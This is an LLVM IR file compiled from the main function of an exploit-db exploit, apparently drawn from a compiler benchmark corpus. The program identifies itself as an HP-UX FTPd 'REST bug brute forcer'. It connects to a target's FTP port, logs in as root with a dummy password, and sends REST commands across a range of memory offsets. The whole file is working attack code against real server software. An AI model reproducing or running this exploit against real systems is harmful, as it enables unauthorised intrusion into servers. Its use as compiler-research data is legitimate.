; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/remote/extr_22733.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/remote/extr_22733.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32*, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [37 x i8] c"DMhpux FTPd - REST bug brute forcer\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"by di0aD\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"usage: %s <host> -- simple enough?\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"%s: unknown host '%s'\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [20 x i8] c"cannot open socket \00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"cannot connect \00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"Sending false login credentials\0A\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"USER root\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [12 x i8] c"sending %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"cannot send data \00", align 1
@.str.10 = private unnamed_addr constant [11 x i8] c"PASS foo\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"REST %d\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca [256 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 1) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call %struct.hostent* @gethostbyname(i8* %25)
  store %struct.hostent* %26, %struct.hostent** %10, align 8
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = icmp eq %struct.hostent* %27, null
  br i1 %28, label %29, label %38

29:                                               ; preds = %22
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0), i8* %32, i8* %35)
  %37 = call i32 @exit(i32 1) #3
  unreachable

38:                                               ; preds = %22
  %39 = load %struct.hostent*, %struct.hostent** %10, align 8
  %40 = getelementptr inbounds %struct.hostent, %struct.hostent* %39, i32 0, i32 2
  %41 = load i32, i32* %40, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %41, i32* %42, align 4
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i32 0, i32 0
  %45 = bitcast i32* %44 to i8*
  %46 = load %struct.hostent*, %struct.hostent** %10, align 8
  %47 = getelementptr inbounds %struct.hostent, %struct.hostent* %46, i32 0, i32 1
  %48 = load i32*, i32** %47, align 8
  %49 = getelementptr inbounds i32, i32* %48, i64 0
  %50 = load i32, i32* %49, align 4
  %51 = load %struct.hostent*, %struct.hostent** %10, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 8
  %54 = call i32 @memcpy(i8* %45, i32 %50, i32 %53)
  %55 = call i32 @htons(i32 21)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %55, i32* %56, align 4
  %57 = load i32, i32* @AF_INET, align 4
  %58 = load i32, i32* @SOCK_STREAM, align 4
  %59 = call i32 @socket(i32 %57, i32 %58, i32 0)
  store i32 %59, i32* %6, align 4
  %60 = load i32, i32* %6, align 4
  %61 = icmp slt i32 %60, 0
  br i1 %61, label %62, label %65

62:                                               ; preds = %38
  %63 = call i32 @perror(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  %64 = call i32 @exit(i32 1) #3
  unreachable

65:                                               ; preds = %38
  %66 = load i32, i32* %6, align 4
  %67 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %68 = call i32 @connect(i32 %66, %struct.sockaddr* %67, i32 12)
  store i32 %68, i32* %7, align 4
  %69 = load i32, i32* %7, align 4
  %70 = icmp slt i32 %69, 0
  br i1 %70, label %71, label %74

71:                                               ; preds = %65
  %72 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %73 = call i32 @exit(i32 1) #3
  unreachable

74:                                               ; preds = %65
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0))
  %76 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %77 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %76, i32 256, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %78)
  %80 = load i32, i32* %6, align 4
  %81 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %82 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %83 = call i32 @strlen(i8* %82)
  %84 = call i32 @send(i32 %80, i8* %81, i32 %83, i32 0)
  store i32 %84, i32* %7, align 4
  %85 = load i32, i32* %7, align 4
  %86 = icmp slt i32 %85, 0
  br i1 %86, label %87, label %92

87:                                               ; preds = %74
  %88 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %89 = load i32, i32* %6, align 4
  %90 = call i32 @close(i32 %89)
  %91 = call i32 @exit(i32 0) #3
  unreachable

92:                                               ; preds = %74
  %93 = load i32, i32* %6, align 4
  %94 = call i32 @dorecv(i32 %93)
  %95 = call i32 @usleep(i32 1000)
  %96 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %97 = call i32 @memset(i8* %96, i32 0, i32 256)
  %98 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %99 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %98, i32 256, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.10, i64 0, i64 0))
  %100 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %100)
  %102 = load i32, i32* %6, align 4
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %104 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %105 = call i32 @strlen(i8* %104)
  %106 = call i32 @send(i32 %102, i8* %103, i32 %105, i32 0)
  store i32 %106, i32* %7, align 4
  %107 = call i32 @usleep(i32 1000)
  %108 = load i32, i32* %6, align 4
  %109 = call i32 @dorecv(i32 %108)
  %110 = load i32, i32* %6, align 4
  %111 = call i32 @dorecv(i32 %110)
  store i64 1073931080, i64* %8, align 8
  br label %112

112:                                              ; preds = %128, %92
  %113 = load i64, i64* %8, align 8
  %114 = icmp sle i64 %113, 1073945000
  br i1 %114, label %115, label %131

115:                                              ; preds = %112
  %116 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %117 = load i64, i64* %8, align 8
  %118 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %116, i32 256, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i64 %117)
  %119 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %119)
  %121 = load i32, i32* %6, align 4
  %122 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %123 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %124 = call i32 @strlen(i8* %123)
  %125 = call i32 @send(i32 %121, i8* %122, i32 %124, i32 0)
  %126 = load i32, i32* %6, align 4
  %127 = call i32 @dorecv(i32 %126)
  br label %128

128:                                              ; preds = %115
  %129 = load i64, i64* %8, align 8
  %130 = add nsw i64 %129, 10
  store i64 %130, i64* %8, align 8
  br label %112

131:                                              ; preds = %112
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @dorecv(i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
